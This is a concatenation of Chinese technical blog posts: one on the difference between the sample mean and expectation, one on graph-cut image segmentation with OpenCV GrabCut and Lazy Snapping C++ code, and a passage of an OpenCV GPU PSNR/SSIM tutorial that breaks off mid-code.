我们的目的是更好的应用，纵然有许多困难，还是需要克服。弄明白了混淆的原因，就要想办法将二者清晰的区分开来了。
区分平均值和期望
本文开头已经叙述过，平均值属于《数理统计》的范围，期望属于《概率论》的范围。文中又说到大数定理的连接作用。接下来我们将对其展开描述。
明确平均值的研究范畴-数理统计
数理统计6是数学的一个分支，通过数据收集、分析、理解来进行推理；应用于科学、工业、社会问题。通常研究的是统计类总体或统计模型的过程。在进行数据普查的时候，统计学家通过设计特定的实验来进行样本收集。其中，典型性抽样假设可以通过合理的方法将基于统计样本的结论和推论应用于整个总体。实验性研究通过设计系统的评价，并对系统进行修改，之后通过相同的过程对系统进行评价，判断通过这种修改系统的方式能否成功的修改系统的测量值。
数据分析领域有两个主要的统计方法：描述统计和统计推断。描述统计使用一些指标如均值、标准差对数据集合进行总结性描述；而统计推断从数据当中得出关于随机变量的结论，是对随机现象的分析，它的基础是概率论。
标准的统计过程是关于测试两个数据样本之间的关系的，一个是真实的数据样本，一个是从理想模型当中采样得到的虚拟样本。通常人们开始时，都先假设这两个数据集之家没有关联，称关系假设为空。之后通过在数据集上进行统计测验，来对这种假设进行验证，根据验证结果来判断假设是否合理。这种情况下就会容易出现两种错误：“false positive”（假设被错误的拒绝）与“false negative”（假设被错误的接受），引起这些问题的因素非常的多：从获取足够的数据样本到想象够多的假设等。
对系统进行衡量而产生统计数据的过程也同样会面对误差，这些误差被分为随机误差和系统误差，但是其他类误差如人们无意间犯的错误、数据源错误等也同样重要。数据的丢失和删除可能会导致有偏性的估计值，当然现在已经有以下特定技巧对其进行缓解。
统计的出现可以追溯到公元前5世纪了，但是直到18世纪才开始了基于计算理论和概率论的理论分析。在近些年，统计已经成为更多的使用统计软件进行统计测试了，例如描述性分析。
从以上描述中可以看出平均值就是描述统计当中一个描述性指标，是数据集合总体趋势的一种描述指标。
数理统计以样本数据集合为出发点；概率论则不同，以事件的概率本质为出发点。
明确期望的研究范畴-概率论
概率论7是数学的一个分支，主要研究事件的概率。虽然概率论有很多种不同的解释，但对于它的表示则是建立在一组公理之上，这可是非常严谨的。严格讲，它将0与1之间的一个数值分配给输出集合（样本空间），这样在概率空间中形式化的表示概率。输出集合的任意子集就称作为一个事件。
概率论研究的主题主要包括离散和连续变量、概率分布、随机过程。它是非确定性或者不确定性过程的一个抽象表示，是随机方式出现或运行过程的一种可测性度量。
虽然不能完美的对随机事件进行预测，但是依然说明了很多规律。概率论有两个主要成果：大数定理和中心极限定理。
作为统计学的数学基础，概率论在人们关于数据定量分析有关的活动中扮演非常重要的角色。在复杂系统当中，当只提供部分信息时，概率论中的方法也可以用来对其进行描述。二十世纪最伟大的发现之一是在量子力学中，人们发现了在原子空间中物理现象的本质是基于概率的。
期望就是其中关于随机变量的一种总体性描述，它是事件本质的一种表达。
丛然，世间事物的本质扑朔迷离，对其进行准确的定量描述十分困难。但是经过众多天才科学家的不懈努力，最终找到了一条通往事物本质的大道，那就是大数定理。
大数定理的应用与局限
大数定理将属于数理统计的平均值和属于概率论的期望联系在一起。通过前文描述我们知道，通过收集大量的样本并计算样本集合的平均值可以无限近似期望，而且事物的其他本质属性则可以通过基于期望的变换得来，因此人们可以通过运用大数定律来接近事物本质。
找到接近事物本质的方法无疑是令人振奋的，其强大的魅力使很多人迷恋。但是，我们知道没有放之四海而皆准的东西，大数定理也不例外。
样本量很大的要求限制了大数定理的应用。大数定理强调需要当样本量趋近无限大的时候，平均值才可以无限接近期望，此时可以使用平均值代替期望，但是很多时候，样本收集具有很大的成本，或是时间成本或是金钱成本，因此只能收集到小样本量的数据。此时根据大数定理采用平均值代替期望的方法可信度就会下降，例如在医学临床试验中样本量太少；在行星轨迹观测中收集时间过长。

为了解决这个问题，人们提出了贝叶斯8的方法，此处不再展开，请查阅其他资料。

学习建议
当然，知识混乱我私以为大部分的责任是旁人的，个人只是承担很少的责任。倘若开始学习就看的是经典教材而不是为了照顾本校某位老师编著教科书的销量；倘若上课老师直接就是领域内的泰山北斗而不是某位领导的弟子；倘若课程中设计了动手实验环节而不是仅仅读书朗诵，那么我相信这种基础概念的混淆是不会出现的。当然以上阐述是以少看剧、少打游戏为前提的。



zhihu, 随机变量的期望E(x)与X的平均值之间的区别与联系？ ↩︎

wikipedia,Average ↩︎

陈希孺.概率论与数理统计[M]. 中国科学技术大学出版社, 2009. ↩︎

wikipedia,Law of large numbers ↩︎

zhihu, 大数定律是必然的吗？ ↩︎

wikipedia，Statistics, 2018-04-12 ↩︎

wikipedia，Probability theory，2018-03-29 ↩︎

wikipedia, Bayes theorem ↩︎










转载请注明出处：http://blog.csdn.net/wangyaninglm/article/details/44151213，
来自：shiter编写程序的艺术
 
 1.绪论
图切割算法是组合图论的经典算法之一。近年来，许多学者将其应用到图像和视频分割中，取得了很好的效果。本文简单介绍了图切算法和交互式图像分割技术，以及图切算法在交互式图像分割中的应用。
 
图像分割指图像分成各具特性的区域并提取出感兴趣目标的技术和过程，它是由图像处理到图像分析的关键步骤，是一种基本的计算机视觉技术。只有在图像分割的基础上才能对目标进行特征提取和参数测量，使得更高层的图像分析和理解成为可能。因此对图像分割方法的研究具有十分重要的意义。
 
图像分割技术的研究已有几十年的历史，但至今人们并不能找到通用的方法能够适合于所有类型的图像。常用的图像分割技术可划分为四类：特征阈值或聚类、边缘检测、区域生长或区域提取。虽然这些方法分割灰度图像效果较好，但用于彩色图像的分割往往达不到理想的效果。
 
交互式图像分割是指，首先由用户以某种交互手段指定图像的部分前景与部分背景，然后算法以用户的输入作为分割的约束条件自动地计算出满足约束条件下的最佳分割。典型的交互手段包括用一把画刷在前景和背景处各画几笔（如[1][4]等）以及在前景的周围画一个方框（如[2]）等。
 
基于图切算法的图像分割技术是近年来国际上图像分割领域的一个新的研究热点。该类方法将图像映射为赋权无向图，把像素视作节点，利用最小切割得到图像的最佳分割。
 
 2.几种改进算法
 
 
 
Graph Cut[1]算法是一种直接基于图切算法的图像分割技术。它仅需要在前景和背景处各画几笔作为输入，算法将建立各个像素点与前景背景相似度的赋权图，并通过求解最小切割区分前景和背景。
 
 
 
Grabcut[2]算法方法的用户交互量很少，仅仅需要指定一个包含前景的矩形，随后用基于图切算法在图像中提取前景。
 
 
 
Lazy Snapping[4]系统则是对[1]的改进。通过预计算和聚类技术，该方法提供了一个即时反馈的平台，方便用户进行交互分割。
 
 
文档说明：
http://download.csdn.net/detail/wangyaninglm/8484301
 
 
3.代码实现效果
说明：使用鼠标左键标注前景，右键标注背景，之后进行分割（程序问题欢迎加群探讨）

 
 

 

 
 
graphcuts代码：
http://download.csdn.net/detail/wangyaninglm/8484243
 
 
 
 
ICCV'2001论文"Interactive graph cuts for optimal boundary and region segmentation of objects in N-D images"。
Graph Cut方法是基于颜色统计采样的方法，因此对前背景相差较大的图像效果较佳。
同时，比例系数lambda的调节直接影响到最终的分割效果。
 
 
grabcut代码：
 

// Grabcut.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"




#include "opencv2/highgui/highgui.hpp"
#include "opencv2/imgproc/imgproc.hpp"

#include <iostream>

#include "ComputeTime.h"
#include "windows.h"

using namespace std;
using namespace cv;

static void help()
{
	cout << "\nThis program demonstrates GrabCut segmentation -- select an object in a region\n"
		"and then grabcut will attempt to segment it out.\n"
		"Call:\n"
		"./grabcut <image_name>\n"
		"\nSelect a rectangular area around the object you want to segment\n" <<
		"\nHot keys: \n"
		"\tESC - quit the program\n"
		"\tr - restore the original image\n"
		"\tn - next iteration\n"
		"\n"
		"\tleft mouse button - set rectangle\n"
		"\n"
		"\tCTRL+left mouse button - set GC_BGD pixels\n"
		"\tSHIFT+left mouse button - set CG_FGD pixels\n"
		"\n"
		"\tCTRL+right mouse button - set GC_PR_BGD pixels\n"
		"\tSHIFT+right mouse button - set CG_PR_FGD pixels\n" << endl;
}

const Scalar RED = Scalar(0,0,255);
const Scalar PINK = Scalar(230,130,255);
const Scalar BLUE = Scalar(255,0,0);
const Scalar LIGHTBLUE = Scalar(255,255,160);
const Scalar GREEN = Scalar(0,255,0);

const int BGD_KEY = CV_EVENT_FLAG_CTRLKEY;  //Ctrl键
const int FGD_KEY = CV_EVENT_FLAG_SHIFTKEY; //Shift键

static void getBinMask( const Mat& comMask, Mat& binMask )
{
	if( comMask.empty() || comMask.type()!=CV_8UC1 )
		CV_Error( CV_StsBadArg, "comMask is empty or has incorrect type (not CV_8UC1)" );
	if( binMask.empty() || binMask.rows!=comMask.rows || binMask.cols!=comMask.cols )
		binMask.create( comMask.size(), CV_8UC1 );
	binMask = comMask & 1;  //得到mask的最低位,实际上是只保留确定的或者有可能的前景点当做mask
}

class GCApplication
{
public:
	enum{ NOT_SET = 0, IN_PROCESS = 1, SET = 2 };
	static const int radius = 2;
	static const int thickness = -1;

	void reset();
	void setImageAndWinName( const Mat& _image, const string& _winName );
	void showImage() const;
	void mouseClick( int event, int x, int y, int flags, void* param );
	int nextIter();
	int getIterCount() const { return iterCount; }
private:
	void setRectInMask();
	void setLblsInMask( int flags, Point p, bool isPr );

	const string* winName;
	const Mat* image;
	Mat mask;
	Mat bgdModel, fgdModel;

	uchar rectState, lblsState, prLblsState;
	bool isInitialized;

	Rect rect;
	vector<Point> fgdPxls, bgdPxls, prFgdPxls, prBgdPxls;
	int iterCount;
};

/*给类的变量赋值*/
void GCApplication::reset()
{
	if( !mask.empty() )
		mask.setTo(Scalar::all(GC_BGD));
	bgdPxls.clear(); fgdPxls.clear();
	prBgdPxls.clear();  prFgdPxls.clear();

	isInitialized = false;
	rectState = NOT_SET;    //NOT_SET == 0
	lblsState = NOT_SET;
	prLblsState = NOT_SET;
	iterCount = 0;
}

/*给类的成员变量赋值而已*/
void GCApplication::setImageAndWinName( const Mat& _image, const string& _winName  )
{
	if( _image.empty() || _winName.empty() )
		return;
	image = &_image;
	winName = &_winName;
	mask.create( image->size(), CV_8UC1);
	reset();
}

/*显示4个点，一个矩形和图像内容，因为后面的步骤很多地方都要用到这个函数，所以单独拿出来*/
void GCApplication::showImage() const
{
	if( image->empty() || winName->empty() )
		return;

	Mat res;
	Mat binMask;
	if( !isInitialized )
		image->copyTo( res );
	else
	{
		getBinMask( mask, binMask );
		image->copyTo( res, binMask );  //按照最低位是0还是1来复制，只保留跟前景有关的图像，比如说可能的前景，可能的背景
	}

	vector<Point>::const_iterator it;
	/*下面4句代码是将选中的4个点用不同的颜色显示出来*/
	for( it = bgdPxls.begin(); it != bgdPxls.end(); ++it )  //迭代器可以看成是一个指针
		circle( res, *it, radius, BLUE, thickness );
	for( it = fgdPxls.begin(); it != fgdPxls.end(); ++it )  //确定的前景用红色表示
		circle( res, *it, radius, RED, thickness );
	for( it = prBgdPxls.begin(); it != prBgdPxls.end(); ++it )
		circle( res, *it, radius, LIGHTBLUE, thickness );
	for( it = prFgdPxls.begin(); it != prFgdPxls.end(); ++it )
		circle( res, *it, radius, PINK, thickness );

	/*画矩形*/
	if( rectState == IN_PROCESS || rectState == SET )
		rectangle( res, Point( rect.x, rect.y ), Point(rect.x + rect.width, rect.y + rect.height ), GREEN, 2);

	imshow( *winName, res );
}

/*该步骤完成后，mask图像中rect内部是3，外面全是0*/
void GCApplication::setRectInMask()
{
	assert( !mask.empty() );
	mask.setTo( GC_BGD );   //GC_BGD == 0
	rect.x = max(0, rect.x);
	rect.y = max(0, rect.y);
	rect.width = min(rect.width, image->cols-rect.x);
	rect.height = min(rect.height, image->rows-rect.y);
	(mask(rect)).setTo( Scalar(GC_PR_FGD) );    //GC_PR_FGD == 3，矩形内部,为可能的前景点
}

void GCApplication::setLblsInMask( int flags, Point p, bool isPr )
{
	vector<Point> *bpxls, *fpxls;
	uchar bvalue, fvalue;
	if( !isPr ) //确定的点
	{
		bpxls = &bgdPxls;
		fpxls = &fgdPxls;
		bvalue = GC_BGD;    //0
		fvalue = GC_FGD;    //1
	}
	else    //概率点
	{
		bpxls = &prBgdPxls;
		fpxls = &prFgdPxls;
		bvalue = GC_PR_BGD; //2
		fvalue = GC_PR_FGD; //3
	}
	if( flags & BGD_KEY )
	{
		bpxls->push_back(p);
		circle( mask, p, radius, bvalue, thickness );   //该点处为2
	}
	if( flags & FGD_KEY )
	{
		fpxls->push_back(p);
		circle( mask, p, radius, fvalue, thickness );   //该点处为3
	}
}

/*鼠标响应函数，参数flags为CV_EVENT_FLAG的组合*/
void GCApplication::mouseClick( int event, int x, int y, int flags, void* )
{
	// TODO add bad args check
	switch( event )
	{
	case CV_EVENT_LBUTTONDOWN: // set rect or GC_BGD(GC_FGD) labels
		{
			bool isb = (flags & BGD_KEY) != 0,
				isf = (flags & FGD_KEY) != 0;
			if( rectState == NOT_SET && !isb && !isf )//只有左键按下时
			{
				rectState = IN_PROCESS; //表示正在画矩形
				rect = Rect( x, y, 1, 1 );
			}
			if ( (isb || isf) && rectState == SET ) //按下了alt键或者shift键，且画好了矩形，表示正在画前景背景点
				lblsState = IN_PROCESS;
		}
		break;
	case CV_EVENT_RBUTTONDOWN: // set GC_PR_BGD(GC_PR_FGD) labels
		{
			bool isb = (flags & BGD_KEY) != 0,
				isf = (flags & FGD_KEY) != 0;
			if ( (isb || isf) && rectState == SET ) //正在画可能的前景背景点
				prLblsState = IN_PROCESS;
		}
		break;
	case CV_EVENT_LBUTTONUP:
		if( rectState == IN_PROCESS )
		{
			rect = Rect( Point(rect.x, rect.y), Point(x,y) );   //矩形结束
			rectState = SET;
			setRectInMask();
			assert( bgdPxls.empty() && fgdPxls.empty() && prBgdPxls.empty() && prFgdPxls.empty() );
			showImage();
		}
		if( lblsState == IN_PROCESS )   //已画了前后景点
		{
			setLblsInMask(flags, Point(x,y), false);    //画出前景点
			lblsState = SET;
			showImage();
		}
		break;
	case CV_EVENT_RBUTTONUP:
		if( prLblsState == IN_PROCESS )
		{
			setLblsInMask(flags, Point(x,y), true); //画出背景点
			prLblsState = SET;
			showImage();
		}
		break;
	case CV_EVENT_MOUSEMOVE:
		if( rectState == IN_PROCESS )
		{
			rect = Rect( Point(rect.x, rect.y), Point(x,y) );
			assert( bgdPxls.empty() && fgdPxls.empty() && prBgdPxls.empty() && prFgdPxls.empty() );
			showImage();    //不断的显示图片
		}
		else if( lblsState == IN_PROCESS )
		{
			setLblsInMask(flags, Point(x,y), false);
			showImage();
		}
		else if( prLblsState == IN_PROCESS )
		{
			setLblsInMask(flags, Point(x,y), true);
			showImage();
		}
		break;
	}
}

/*该函数进行grabcut算法，并且返回算法运行迭代的次数*/
int GCApplication::nextIter()
{
	if( isInitialized )
		//使用grab算法进行一次迭代，参数2为mask，里面存的mask位是：矩形内部除掉那些可能是背景或者已经确定是背景后的所有的点，且mask同时也为输出
		//保存的是分割后的前景图像
		grabCut( *image, mask, rect, bgdModel, fgdModel, 1 );
	else
	{
		if( rectState != SET )
			return iterCount;

		if( lblsState == SET || prLblsState == SET )
			grabCut( *image, mask, rect, bgdModel, fgdModel, 1, GC_INIT_WITH_MASK );
		else
			grabCut( *image, mask, rect, bgdModel, fgdModel, 1, GC_INIT_WITH_RECT );

		isInitialized = true;
	}
	iterCount++;

	bgdPxls.clear(); fgdPxls.clear();
	prBgdPxls.clear(); prFgdPxls.clear();

	return iterCount;
}

GCApplication gcapp;

static void on_mouse( int event, int x, int y, int flags, void* param )
{
	gcapp.mouseClick( event, x, y, flags, param );
}

int main( int argc, char** argv )
{
	string filename;
	cout<<" Grabcuts ! \n";
	cout<<"input image name:  "<<endl;
	cin>>filename;

	
	Mat image = imread( filename, 1 );
	if( image.empty() )
	{
		cout << "\n Durn, couldn't read image filename " << filename << endl;
		return 1;
	}

	help();

	const string winName = "image";
	cvNamedWindow( winName.c_str(), CV_WINDOW_AUTOSIZE );
	cvSetMouseCallback( winName.c_str(), on_mouse, 0 );

	gcapp.setImageAndWinName( image, winName );
	gcapp.showImage();

	for(;;)
	{
		int c = cvWaitKey(0);
		switch( (char) c )
		{
		case '\x1b':
			cout << "Exiting ..." << endl;
			goto exit_main;
		case 'r':
			cout << endl;
			gcapp.reset();
			gcapp.showImage();
			break;
		case 'n':
			ComputeTime ct ;
			ct.Begin();
			
			int iterCount = gcapp.getIterCount();
			cout << "<" << iterCount << "... ";
			int newIterCount = gcapp.nextIter();
			if( newIterCount > iterCount )
			{
				gcapp.showImage();
				cout << iterCount << ">" << endl;
				cout<<"运行时间:  "<<ct.End()<<endl;
			}
			else
				cout << "rect must be determined>" << endl;
			break;
		}
	}

exit_main:
	cvDestroyWindow( winName.c_str() );
	return 0;
}


 lazy snapping代码实现：
 

// LazySnapping.cpp : 定义控制台应用程序的入口点。
//
/* author: zhijie Lee
 * home page: lzhj.me
 * 2012-02-06
 */
#include "stdafx.h"
#include <cv.h>
#include <highgui.h>
#include "graph.h"
#include <vector>
#include <iostream>
#include <cmath>
#include <string>

using namespace std;

typedef Graph<float,float,float> GraphType;

class LasySnapping
{
    
public :
	LasySnapping();

    ~LasySnapping()
	{ 
        if(graph)
		{
            delete graph;
        }
    };
private :
    vector<CvPoint> forePts;
    vector<CvPoint> backPts;
    IplImage* image;
    // average color of foreground points
    unsigned char avgForeColor[3];
    // average color of background points
    unsigned char avgBackColor[3];
public :
    void setImage(IplImage* image)
	{
        this->image = image;
        graph = new GraphType(image->width*image->height,image->width*image->height*2);
    }
    // include-pen locus
    void setForegroundPoints(vector<CvPoint> pts)
	{
        forePts.clear();
        for(int i =0; i< pts.size(); i++)
		{
            if(!isPtInVector(pts[i],forePts))
			{
                forePts.push_back(pts[i]);
            }
        }
        if(forePts.size() == 0)
		{
            return;
        }
        int sum[3] = {0};
        for(int i =0; i < forePts.size(); i++)
		{
            unsigned char* p = (unsigned char*)image->imageData + forePts[i].x * 3 
                + forePts[i].y*image->widthStep;
            sum[0] += p[0];
            sum[1] += p[1];
            sum[2] += p[2];            
        }
        cout<<sum[0]<<" " <<forePts.size()<<endl;
        avgForeColor[0] = sum[0]/forePts.size();
        avgForeColor[1] = sum[1]/forePts.size();
        avgForeColor[2] = sum[2]/forePts.size();
    }
    // exclude-pen locus
    void setBackgroundPoints(vector<CvPoint> pts)
	{
        backPts.clear();
        for(int i =0; i< pts.size(); i++)
		{
            if(!isPtInVector(pts[i],backPts))
			{
                backPts.push_back(pts[i]);
            }
        }
        if(backPts.size() == 0)
		{
            return;
        }
        int sum[3] = {0};
        for(int i =0; i < backPts.size(); i++)
		{
            unsigned char* p = (unsigned char*)image->imageData + backPts[i].x * 3 + 
                backPts[i].y*image->widthStep;
            sum[0] += p[0];
            sum[1] += p[1];
            sum[2] += p[2];            
        }
        avgBackColor[0] = sum[0]/backPts.size();
        avgBackColor[1] = sum[1]/backPts.size();
        avgBackColor[2] = sum[2]/backPts.size();
    }

    // return maxflow of graph
    int runMaxflow();
    // get result, a grayscale mast image indicating forground by 255 and background by 0
    IplImage* getImageMask();

private :

    float colorDistance(unsigned char* color1, unsigned char* color2);
    float minDistance(unsigned char* color, vector<CvPoint> points);
    bool isPtInVector(CvPoint pt, vector<CvPoint> points);
    void getE1(unsigned char* color,float* energy);
    float getE2(unsigned char* color1,unsigned char* color2);
    
    GraphType *graph;    
};

LasySnapping::LasySnapping()
{
	graph = NULL;
	avgForeColor[0] = 0;
	avgForeColor[1] = 0;
	avgForeColor[2] = 0;

	avgBackColor[0] = 0;
	avgBackColor[1] = 0;
	avgBackColor[2] = 0;

	
}



float LasySnapping::colorDistance(unsigned char* color1, unsigned char* color2)
{
	
    return sqrt(((float)color1[0]-(float)color2[0])*((float)color1[0]-(float)color2[0])+
        ((float)color1[1]-(float)color2[1])*((float)color1[1]-(float)color2[1])+
        ((float)color1[2]-(float)color2[2])*((float)color1[2]-(float)color2[2]));    
}

float LasySnapping::minDistance(unsigned char* color, vector<CvPoint> points)
{
    float distance = -1;
    for(int i =0 ; i < points.size(); i++)
	{
        unsigned char* p = (unsigned char*)image->imageData + points[i].y * image->widthStep + 
            points[i].x * image->nChannels;
        float d = colorDistance(p,color);
        if(distance < 0 )
		{
            distance = d;
        }
		else
		{
            if(distance > d)
			{
                distance = d;
            }
        }
    }

	return distance;
}

bool LasySnapping::isPtInVector(CvPoint pt, vector<CvPoint> points)
{
    for(int i =0 ; i < points.size(); i++)
	{
        if(pt.x == points[i].x && pt.y == points[i].y)
		{
            return true;
        }
    }
    return false;
}
void LasySnapping::getE1(unsigned char* color,float* energy)
{
    // average distance
    float df = colorDistance(color,avgForeColor);
    float db = colorDistance(color,avgBackColor);
    // min distance from background points and forground points
    // float df = minDistance(color,forePts);
    // float db = minDistance(color,backPts);
    energy[0] = df/(db+df);
    energy[1] = db/(db+df);
}

float LasySnapping::getE2(unsigned char* color1,unsigned char* color2)
{
    const float EPSILON = 0.01;
    float lambda = 100;
    return lambda/(EPSILON+
        (color1[0]-color2[0])*(color1[0]-color2[0])+
        (color1[1]-color2[1])*(color1[1]-color2[1])+
        (color1[2]-color2[2])*(color1[2]-color2[2]));
}

int LasySnapping::runMaxflow()
{   
    const float INFINNITE_MAX = 1e10;
    int indexPt = 0;
    for(int h = 0; h < image->height; h ++)
	{
        unsigned char* p = (unsigned char*)image->imageData + h *image->widthStep;
        for(int w = 0; w < image->width; w ++)
		{
            // calculate energe E1
            float e1[2]={0};
            if(isPtInVector(cvPoint(w,h),forePts))
			{
                e1[0] =0;
                e1[1] = INFINNITE_MAX;
            }
			else if
				(isPtInVector(cvPoint(w,h),backPts))
			{
                e1[0] = INFINNITE_MAX;
                e1[1] = 0;
            }
			else 
			{
                getE1(p,e1);
            }

            // add node
            graph->add_node();
            graph->add_tweights(indexPt, e1[0],e1[1]);

            // add edge, 4-connect
            if(h > 0 && w > 0)
			{
                float e2 = getE2(p,p-3);
                graph->add_edge(indexPt,indexPt-1,e2,e2);
                e2 = getE2(p,p-image->widthStep);
                graph->add_edge(indexPt,indexPt-image->width,e2,e2);
            }
            
            p+= 3;
            indexPt ++;            
        }
    }
    
    return graph->maxflow();
}

IplImage* LasySnapping::getImageMask()
{
    IplImage* gray = cvCreateImage(cvGetSize(image),8,1); 
    int indexPt =0;
    for(int h =0; h < image->height; h++)
	{
        unsigned char* p = (unsigned char*)gray->imageData + h*gray->widthStep;
        for(int w =0 ;w <image->width; w++)
		{
            if (graph->what_segment(indexPt) == GraphType::SOURCE)
			{
                *p = 0;
            }
			else
			{
                *p = 255;
            }

            p++;
            indexPt ++;
        }
    }
    return gray;
}

// global
vector<CvPoint> forePts;
vector<CvPoint> backPts;
int currentMode = 0;// indicate foreground or background, foreground as default
CvScalar paintColor[2] = {CV_RGB(0,0,255),CV_RGB(255,0,0)};

IplImage* image = NULL;
char* winName = "lazySnapping";
IplImage* imageDraw = NULL;
const int SCALE = 4;

void on_mouse( int event, int x, int y, int flags, void* )
{    
    if( event == CV_EVENT_LBUTTONUP )
	{
        if(backPts.size() == 0 && forePts.size() == 0)
		{
            return;
        }
        LasySnapping ls;
        IplImage* imageLS = cvCreateImage(cvSize(image->width/SCALE,image->height/SCALE),
            8,3);
        cvResize(image,imageLS);
        ls.setImage(imageLS);
        ls.setBackgroundPoints(backPts);
        ls.setForegroundPoints(forePts);
        ls.runMaxflow();
        IplImage* mask = ls.getImageMask();
        IplImage* gray = cvCreateImage(cvGetSize(image),8,1);
        cvResize(mask,gray);
        // edge
        cvCanny(gray,gray,50,150,3);
        
        IplImage* showImg = cvCloneImage(imageDraw);
        for(int h =0; h < image->height; h ++)
		{
            unsigned char* pgray = (unsigned char*)gray->imageData + gray->widthStep*h;
            unsigned char* pimage = (unsigned char*)showImg->imageData + showImg->widthStep*h;
            for(int width  =0; width < image->width; width++)
			{
                if(*pgray++ != 0 )
				{
                    pimage[0] = 0;
                    pimage[1] = 255;
                    pimage[2] = 0;
                }
                pimage+=3;                
            }
        }
        cvSaveImage("t.bmp",showImg);
        cvShowImage(winName,showImg);
        cvReleaseImage(&imageLS);
        cvReleaseImage(&mask);
        cvReleaseImage(&showImg);
        cvReleaseImage(&gray);
    }
	else if( event == CV_EVENT_LBUTTONDOWN )
	{

    }
	else if( event == CV_EVENT_MOUSEMOVE && (flags & CV_EVENT_FLAG_LBUTTON))
	{
        CvPoint pt = cvPoint(x,y);
        if(currentMode == 0)
		{//foreground
            forePts.push_back(cvPoint(x/SCALE,y/SCALE));
        }
		else
		{//background
            backPts.push_back(cvPoint(x/SCALE,y/SCALE));
        }
        cvCircle(imageDraw,pt,2,paintColor[currentMode]);
        cvShowImage(winName,imageDraw);
    }
}
int main(int argc, char** argv)
{	
    //if(argc != 2)
	//{
     //   cout<<"command : lazysnapping inputImage"<<endl;
     //   return 0;
   // }

	string image_name;
	cout<<"input image name: "<<endl;
	cin>>image_name;

    cvNamedWindow(winName,1);
    cvSetMouseCallback( winName, on_mouse, 0);
    
    image = cvLoadImage(image_name.c_str(),CV_LOAD_IMAGE_COLOR);
    imageDraw = cvCloneImage(image);
    cvShowImage(winName, image);
    for(;;)
	{
        int c = cvWaitKey(0);
        c = (char)c;
        if(c == 27)
		{//exit
            break;
        }
		else if(c == 'r')
		{//reset
            image = cvLoadImage(image_name.c_str(),CV_LOAD_IMAGE_COLOR);
            imageDraw = cvCloneImage(image);
            forePts.clear();
            backPts.clear();
            currentMode = 0;
            cvShowImage(winName, image);
        }
		else if(c == 'b')
		{//change to background selection
            currentMode = 1;
        }else if(c == 'f')
		{//change to foreground selection
            currentMode = 0;
        }
    }
    cvReleaseImage(&image);
    cvReleaseImage(&imageDraw);
	return 0;
}


 
 
 
 
参考文献
[1] Y. Boykov, and M. P. Jolly, “Interactive graph cuts for optimal boundary and region segmentation ofobjects in N-D images”,Proceeding ofIEEE International Conference on Computer Vision, 1:105~112, July 2001.
[2] C. Rother, A. Blake, and V. Kolmogorov, “Grabcut – interactive foreground extractionusing iterated graph cuts”,Proceedingsof ACM SIGGRAPH 2004, 23(3):307~312, August 2004.
[3] A. Agarwala, M. Dontcheva, M. Agrawala,et al, “Interactive digital photomontage”,Proceedings of ACM SIGGRAPH 2004, 23(3):294~302, August 2004.
[4] Y. Li, J. Sun, C. Tang,et al, “Interacting withimages: Lazy snapping”,Proceedingsof ACM SIGGRAPH 2004, 23(3):303~308, August 2004.
[5] A. Blake, C. Rother, M. Brown,et al, “Interactive ImageSegmentation using an adaptive GMMRF model”.Proceedings of European Conference on Computer Vision, pp. 428~441,May 2004.
[6] V. Kwatra, A. Schodl, I. Essa,et al, “Graphcut Textures:Image and Video Synthesis Using Graph Cuts”.Proceedings of ACM Siggraph 2003, pp.277~286, Augst 2003.
 
部分代码与文档是早些时候收集的，出处找不到了，还请原作者看到后联系注明。
 
转载请注明出处：http://blog.csdn.net/wangyaninglm/article/details/44151213，
来自：shiter编写程序的艺术
  





 
原文链接：
http://www.opencv.org.cn/opencvdoc/2.3.2/html/doc/tutorials/gpu/gpu-basics-similarity/gpu-basics-similarity.html
 
代码中有错误，关于GpuMat OpenCV代码中没有对其进行操作符运算的重载，所有编译的时候有错误。对于GpuMat的运算只能调用相关函数才行，后面我嫌麻烦就没有重写
 
 
 
<span style="font-size:18px;">// PSNR.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"

#include <iostream>                   // Console I/O
#include <sstream>                    // String to number conversion

#include <opencv2/core/core.hpp>      // Basic OpenCV structures
#include <opencv2/imgproc/imgproc.hpp>// Image processing methods for the CPU
#include <opencv2/highgui/highgui.hpp>// Read images
#include <opencv2/gpu/gpu.hpp>        // GPU structures and methods

using namespace std;
using namespace cv;

double getPSNR(const Mat& I1, const Mat& I2);      // CPU versions
Scalar getMSSIM( const Mat& I1, const Mat& I2);

double getPSNR_GPU(const Mat& I1, const Mat& I2);  // Basic GPU versions
Scalar getMSSIM_GPU( const Mat& I1, const Mat& I2);

struct BufferPSNR                                     // Optimized GPU versions
{   // Data allocations are very expensive on GPU. Use a buffer to solve: allocate once reuse later.
	gpu::GpuMat gI1, gI2, gs, t1,t2;

	gpu::GpuMat buf;
};
double getPSNR_GPU_optimized(const Mat& I1, const Mat& I2, BufferPSNR& b);

struct BufferMSSIM                                     // Optimized GPU versions
{   // Data allocations are very expensive on GPU. Use a buffer to solve: allocate once reuse later.
	gpu::GpuMat gI1, gI2, gs, t1,t2;

	gpu::GpuMat I1_2, I2_2, I1_I2;
	vector<gpu::GpuMat> vI1, vI2;

	gpu::GpuMat mu1, mu2; 
	gpu::GpuMat mu1_2, mu2_2, mu1_mu2; 

	gpu::GpuMat sigma1_2, sigma2_2, sigma12; 
	gpu::GpuMat t3; 

	gpu::GpuMat ssim_map;

	gpu::GpuMat buf;
};
Scalar getMSSIM_GPU_optimized( const Mat& i1, const Mat& i2, BufferMSSIM& b);

void help()
{
	cout
		<< "\n--------------------------------------------------------------------------" << endl
		<< "This program shows how to port your CPU code to GPU or write that from scratch." << endl
		<< "You can see the performance improvement for the similarity check methods (PSNR and SSIM)."  << endl
		<< "Usage:"                                                               << endl
		<< "./gpu-basics-similarity referenceImage comparedImage numberOfTimesToRunTest(like 10)." << endl
		<< "--------------------------------------------------------------------------"   << endl
		<< endl;
}

int main(int argc, char *argv[])
{
	help(); 
	Mat I1 = imread("swan1.jpg",1);           // Read the two images
	Mat I2 = imread("swan2.jpg",1);

	if (!I1.data || !I2.data)           // Check for success
	{
		cout << "Couldn't read the image";
		return 0;
	}

	BufferPSNR bufferPSNR;
	BufferMSSIM bufferMSSIM;

	int TIMES; 
	stringstream sstr("500"); 
	sstr >> TIMES;
	double time, result;

	//------------------------------- PSNR CPU ----------------------------------------------------
	time = (double)getTickCount();    

	for (int i = 0; i < TIMES; ++i)
		result = getPSNR(I1,I2);

	time = 1000*((double)getTickCount() - time)/getTickFrequency();
	time /= TIMES;

	cout << "Time of PSNR CPU (averaged for " << TIMES << " runs): " << time << " milliseconds."
		<< " With result of: " <<  result << endl; 

	//------------------------------- PSNR GPU ----------------------------------------------------
